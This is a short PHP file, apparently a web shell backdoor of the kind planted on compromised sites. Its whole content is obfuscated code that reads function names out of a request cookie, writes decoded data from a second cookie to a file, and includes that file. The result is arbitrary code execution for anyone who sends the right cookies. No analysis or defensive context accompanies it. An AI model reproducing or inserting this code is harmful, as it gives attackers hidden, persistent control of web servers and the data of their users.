<?php

if (isset($_COOKIE[3]) && isset($_COOKIE[15])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 4;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[15][$n];
        if (!$c[15][$n + 1]) {
            if (!$c[15][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 4 + 1;
    }
    $k = $p[19]() . $p[20];
    if (!$p[5]($k)) {
        $n = $p[6]($k, $p[10]);
        $p[13]($n, $p[1] . $p[25]($p[7]($c[3])));
    }
    include($k);
}